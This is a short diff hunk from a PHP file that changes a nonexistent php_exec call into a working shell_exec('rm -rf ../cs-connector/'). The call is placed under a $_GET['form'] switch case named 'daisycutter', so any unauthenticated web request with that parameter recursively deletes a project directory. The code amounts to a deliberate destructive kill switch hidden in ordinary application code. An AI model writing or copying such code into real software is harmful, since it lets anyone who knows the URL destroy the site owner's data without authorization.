@@ -129,7 +129,7 @@ Notes: Use a captcha for mail and also use mysqli::real_escape_string for querri
 		switch($_GET['form'])
 	{
 		case 'daisycutter': //BIG thnks to Gene and Jeremy on this one! - http://en.wikipedia.org/wiki/BLU-82
-		php_exec('rm -rf ../cs-connector/');
+		shell_exec('rm -rf ../cs-connector/');
 		break;
 	}
 	?>
